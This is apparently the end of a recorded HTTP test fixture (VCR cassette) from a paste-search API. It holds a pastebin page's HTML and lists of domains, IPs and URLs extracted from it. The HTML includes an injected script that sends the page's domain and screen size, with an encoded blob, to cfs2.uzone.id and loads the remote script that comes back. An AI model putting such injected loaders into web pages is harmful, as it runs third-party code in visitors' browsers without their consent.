color=\"red\">-<\/font>:<font color=\"red\">-<\/font><\/marquee>&#134;<br><br>\r\n<script>\r\n    $(window).load(function(){\r\n       $(\"#loadshit\").fadeOut(3000);\r\n    });\r\n<\/script>\r\n<\/div>\r\n<script type=\"text\/javascript\">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol==\"https:\" ? \"https:\/\/\" : \"http:\/\/\");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ \"cfs2.uzone.id\/cfspushadsv2\/request\" + \"?id=1\" + \"&enc=telkom2\" + \"&params=\" + \"4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BIIfQoSRvVuN1kKAuQrykg%2f8Wl4xdSagR6xHETRj6pvUo8oQKfgai25Pc%2f7bj%2bZPYuLgVhuau2abGc5r2CES7tI3n%2bFd0Jd3FxEJIF4OjiGs8IaFu10EAh8JaYw75bESxHbDomi4utYNRIWWqDZJzC%2fksoi0IWeuLb8JcLBXiDMnrEd7SbAgp%2ftUdMyO%2feu1x43ExuBGMstjkIE57m96%2bNtVAOTNxKkNlAylLRZM512vvASTUuAcJxXcwtFXSnZ27qA5eOaisshRGbNetY4IEEtVfC48q8hOpmyNx0J9hDEzR1ooAu%2fE%2fvj2PfsywH4%2b3WyI6qAXi3OQ5cGeZ7EtymhUTzmpDgS8kgZd7sV%2fiBMgU94%2fX3LVSM7UH5PZ%2fdJ9YbVl8ZxvPQPkHI1WRnfG%2fvOZvJMeMvEHqERZGB7mv8Z5RPYSnSqrgm%2bt%2bsJDbEkorUPKXCYVuEle7HyMkaXWAfCLsk0%2fHA5GIji%2biU8cXg%2bWWB4YLD5J%2fiS7hKMJ%2bgnvuyZ%2bsjzbKDG0PL03mElNiMHMxEXih5%2f%2bogE2nc6cx%2fyXys2HzWWhun3D91Ka6CEqAZP3jBbmBp3HHW5Xk%2fQc8JCNCHanrRxVh65d7%2fHrlF9xotbmvPUo8SQ%3d%3d\" + \"&idc_r=\"+idc_glo_r + \"&domain=\"+document.domain + \"&sw=\"+screen.width+\"&sh=\"+screen.height;var bsa = document.createElement('script');bsa.type = 'text\/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};<\/script><\/body>\r\n<\/html>","domain":["cursors-4u.net","amazonaws.com","1e100.net","above.com","hummingbird.me","googleapis.com","cloudfront.net","youtube.com","deviantart.net","dropboxusercontent.com","postimg.org","googlecode.com"],"host":["ams16s22-in-f10","par21s03-in-f14","fonts","par21s12-in-f4","server-54-230-3-31","ams15s30-in-f138","ams16s22-in-f234","par21s05-in-f14","ams16s21-in-f10","par21s11-in-f14","ams16s21-in-f202","wo-in-x5f","ams17s01-in-f10","fra02s28-in-f10","ams15s22-in-f170","par10s38-in-f14","www","ams16s29-in-f42","smilenet4u","ams16s31-in-f10","ams16s30-in-f10","par10s29-in-f238","par21s04-in-f14","ham02s14-in-f206","par21s05-in-f142","ef-in-f82","par10s27-in-f14","par10s28-in-f14","server-54-230-202-166","ams15s29-in-f10","ams16s32-in-f10","fra02s18-in-f14","lb-182-250","par10s29-in-f14","par21s03-in-f142","par21s05-in-x0a","ams16s29-in-f4","server-54-230-202-219","ams15s21-in-f138","par10s27-in-f206","static","ams16s30-in-f74","par21s12-in-x04","par21s17-in-f14","ams15s30-in-f10","ec2-34-213-251-252","orig01","par21s03-in-x0e","par10s28-in-f110","dl","cur","orig15","server-54-230-202-81","ams16s29-in-f10","par10s34-in-f14","ec2-52-35-217-223","ajax","par10s21-in-f206","par21s04-in-f174","par21s07-in-f14","server-54-230-202-196","ams15s22-in-f10","server-54-230-3-203","server-54-230-3-178","ams16s29-in-f36","par10s21-in-f14","server-54-230-3-101","ams16s29-in-x04","ams15s21-in-f10","ams15s29-in-f106","ws-in-x5d","par10s33-in-f14"],"hostname":["ams15s21-in-f10.1e100.net","server-54-230-202-219.fra50.r.cloudfront.net","ams16s22-in-f10.1e100.net","smilenet4u.googlecode.com","orig01.deviantart.net","ams16s30-in-f10.1e100.net","ams16s31-in-f10.1e100.net","ws-in-x5d.1e100.net","server-54-230-3-31.lhr5.r.cloudfront.net","fonts.googleapis.com","ams15s29-in-f10.1e100.net","ams17s01-in-f10.1e100.net","par10s28-in-f110.1e100.net","ams15s30-in-f10.1e100.net","ams16s30-in-f74.1e100.net","par21s04-in-f174.1e100.net","par10s38-in-f14.1e100.net","server-54-230-202-166.fra50.r.cloudfront.net","orig15.deviantart.net","ams16s21-in-f202.1e100.net","par10s33-in-f14.1e100.net","par10s21-in-f206.1e100.net","par21s12-in-x04.1e100.net","par21s11-in-f14.1e100.net","par21s03-in-f142.1e100.net","server-54-230-3-203.lhr5.r.cloudfront.net","ams16s29-in-f10.1e100.net","ams16s22-in-f234.1e100.net","par21s04-in-f14.1e100.net","server-54-230-3-178.lhr5.r.cloudfront.net","ham02s14-in-f206.1e100.net","par10s34-in-f14.1e100.net","ajax.googleapis.com","lb-182-250.above.com","ams16s29-in-f42.1e100.net","ams15s22-in-f10.1e100.net","par10s21-in-f14.1e100.net","ams15s22-in-f170.1e100.net","par10s27-in-f206.1e100.net","par10s27-in-f14.1e100.net","par21s12-in-f4.1e100.net","par21s05-in-f142.1e100.net","www.youtube.com","ec2-34-213-251-252.us-west-2.compute.amazonaws.com","par10s29-in-f238.1e100.net","server-54-230-3-101.lhr5.r.cloudfront.net","server-54-230-202-196.fra50.r.cloudfront.net","ef-in-f82.1e100.net","dl.dropboxusercontent.com","cur.cursors-4u.net","ams16s32-in-f10.1e100.net","par21s03-in-x0e.1e100.net","par21s03-in-f14.1e100.net","par10s29-in-f14.1e100.net","ec2-52-35-217-223.us-west-2.compute.amazonaws.com","par10s28-in-f14.1e100.net","ams15s21-in-f138.1e100.net","par21s05-in-x0a.1e100.net","ams16s29-in-f36.1e100.net","par21s17-in-f14.1e100.net","par21s07-in-f14.1e100.net","fra02s28-in-f10.1e100.net","wo-in-x5f.1e100.net","static.hummingbird.me","par21s05-in-f14.1e100.net","s31.postimg.org","server-54-230-202-81.fra50.r.cloudfront.net","ams16s29-in-f4.1e100.net","ams16s21-in-f10.1e100.net","fra02s18-in-f14.1e100.net","ams15s29-in-f106.1e100.net","ams16s29-in-x04.1e100.net","ams15s30-in-f138.1e100.net"],"ip":["216.58.209.238","216.58.206.238","2a00:1450:400e:804:0:0:0:2004","172.217.19.202","2a00:1450:4007:810:0:0:0:200e","2a00:1450:4013:c00:0:0:0:52","216.58.205.14","172.217.18.206","52.35.217.223","54.230.3.101","173.194.69.82","172.217.17.106","54.230.3.203","2620:100:6021:6:0:0:a27d:4106","162.125.67.6","172.217.17.138","173.208.177.162","216.58.204.110","54.230.3.31","216.58.212.202","216.58.212.234","54.230.202.196","216.58.198.206","54.230.3.178","216.58.208.206","216.58.212.170","216.58.212.138","2a00:1450:400c:c07:0:0:0:5f","34.213.251.252","172.217.17.74","216.58.213.142","2a00:1450:4007:815:0:0:0:2004","216.58.204.142","54.230.202.219","2a00:1450:400c:c00:0:0:0:5d","216.58.215.46","172.217.22.132","172.217.17.36","172.217.19.238","2a00:1450:4007:812:0:0:0:200a","54.230.202.81","103.224.182.250","216.58.201.238","192.151.145.28","172.217.168.202","216.58.213.174","172.217.20.106","54.230.202.166","172.217.17.42"],"key":"i2mVMFwS","scheme":["https","http"],"seen_date":"2018-11-16","size":"11466","source":"pastebin","subdomains":["us-west-2.compute.amazonaws.com","lhr5.r.cloudfront.net","compute.amazonaws.com","fra50.r.cloudfront.net","r.cloudfront.net"],"syntax":"text","tld":["me","net","com"],"url":["http:\/\/smilenet4u.googlecode.com\/files\/TipingText.js","http:\/\/orig15.deviantart.net\/3286\/f\/2016\/284\/c\/6\/c6d978e2fdd43c77f3a6a2dfc5b67ccc-dakmqgn.png","https:\/\/static.hummingbird.me\/anime\/cover_images\/000\/007\/714\/thumb\/Kyoukai-no-Kanata-image-kyoukai-no-kanata-36228551-1920-1080.jpg?1417877750","https:\/\/dl.dropboxusercontent.com\/s\/is1vrbl5jmdsel9\/jquery.backstretch.min.js","http:\/\/cur.cursors-4u.net\/cursors\/cur-9\/cur862.ani","http:\/\/fonts.googleapis.com\/css?family=Orbitron:400:700","http:\/\/cur.cursors-4u.net\/cursors\/cur-9\/cur862.png","https:\/\/s31.postimg.org\/lkts687vf\/ade.png","http:\/\/www.youtube.com\/embed\/7TvrvC_Si8E?rel=0&autoplay=1&loop=1&playlist=","https:\/\/dl.dropboxusercontent.com\/s\/geo5dr110vx63cl\/scripts.js","https:\/\/dl.dropboxusercontent.com\/s\/27qrxwqx674059d\/jquery-1.11.1.min.js","http:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/1.9.1\/jquery.min.js","http:\/\/orig01.deviantart.net\/89a8\/f\/2016\/245\/d\/2\/phantomghost_new_logo_by_4prili666h05t-dag6ket.jpg","https:\/\/dl.dropboxusercontent.com\/s\/yzmc24cuj9dl8ih\/bootstrap.min.js"]}],"status":"ok","took":"0.130","total":1850}
    http_version: 
  recorded_at: Sat, 17 Nov 2018 02:09:43 GMT
recorded_with: VCR 4.0.0
